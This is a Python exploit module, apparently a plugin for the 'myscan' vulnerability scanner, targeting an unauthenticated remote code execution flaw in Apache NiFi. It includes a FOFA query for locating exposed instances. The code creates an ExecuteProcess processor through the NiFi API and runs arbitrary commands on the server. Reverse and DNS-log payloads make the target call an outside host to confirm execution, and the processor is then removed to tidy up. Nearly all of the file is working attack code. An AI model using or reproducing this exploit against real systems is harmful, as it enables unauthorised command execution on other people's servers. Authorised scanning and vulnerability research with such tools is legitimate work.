# !/usr/bin/env python3
# @Time    : 2020/11/30
# @Author  : caicai
# @File    : poc_apache_nifi_rce_2020.py

'''
fofa:
"nifi" && title=="NiFi"

'''

from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse, generate
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.threads import mythread
from myscan.config import scan_set

import json


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "apache_nifi_rce"
        self.vulmsg = "link:https://github.com/imjdl/Apache-NiFi-Api-RCE"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.success = False

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        reverse_urls, hexdata_url = generate_reverse_payloads(self.name)
        reverse_dnscmd, hexdata_dns = generate_reverse_payloads(self.name, "dns")
        tasks = reverse_dnscmd + reverse_urls
        mythread(self.exploit, tasks)

        sleep = True
        for hexdata in [hexdata_url, hexdata_dns]:
            query_res, _ = query_reverse(hexdata, sleep)
            sleep = False
            if query_res:
                parser_ = dictdata_parser(self.dictdata)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others:": "{} in dnslog".format(hexdata),
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
                break

    def check_is_vul(self):
        url = self.url + "nifi-api/access/config"
        try:
            req = {
                "method": "GET",
                "url": url,
                "timeout": 10,
                "verify": False,
                "allow_redirects": False
            }
            res = request(**req)
            data = res.json()
            return not data["config"]["supportsLogin"]
        except Exception as e:
            pass
        return False

    def clean_up(self, p_id):
        req = {
            "method": "PUT",
            "url": self.url + "nifi-api/processors/" + p_id + "/run-status",
            "timeout": 10,
            "data": json.dumps({'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}),
            "verify": False,
            "allow_redirects": False
        }
        request(**req)
        req["method"] = "DELETE"
        req["url"] = self.url + "threads"
        del req["data"]
        request(**req)

    def exploit(self, cmd):
        g_id = self.fetch_process_group()
        if g_id:
            p_id = self.create_process(g_id)
            if p_id:
                self.run_cmd(p_id=p_id, cmd=cmd)
                self.clean_up(p_id=p_id)

    def run_cmd(self, p_id, cmd):

        cmd = cmd.split(" ")
        data = {
            'component': {
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'properties': {
                        'Command': cmd[0],
                        'Command Arguments': " ".join(cmd[1:]),
                    },
                    'schedulingPeriod': '3600 sec'
                },
                'id': p_id,
                'state': 'RUNNING'
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        headers = {
            "Content-Type": "application/json",
        }
        req = {
            "method": "PUT",
            "url": self.url + "nifi-api/processors/" + p_id,
            "timeout": 10,
            "headers": headers,
            "data": json.dumps(data),
            "verify": False,
            "allow_redirects": False
        }
        res = request(**req)
        return res.json()

    def fetch_process_group(self):
        url = self.url + "nifi-api/process-groups/root"
        try:
            req = {
                "method": "GET",
                "url": url,
                "timeout": 10,
                "verify": False,
                "allow_redirects": False
            }
            res = request(**req)
            data = res.json()["id"]
            return data
        except Exception as e:
            pass
        return 0

    def create_process(self, process_group_id):
        url = self.url + "nifi-api/process-groups/" + process_group_id + "/processors"
        data = {
            'component': {
                'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
            },
            'revision': {
                'version': 0
            }
        }
        headers = {
            "Content-Type": "application/json",
        }
        try:
            req = {
                "method": "POST",
                "url": url,
                "timeout": 10,
                "data": json.dumps(data),
                "headers": headers,
                "verify": False,
                "allow_redirects": False
            }
            res = request(**req)
            return res.json()["id"]
        except Exception as e:
            pass
        return 0
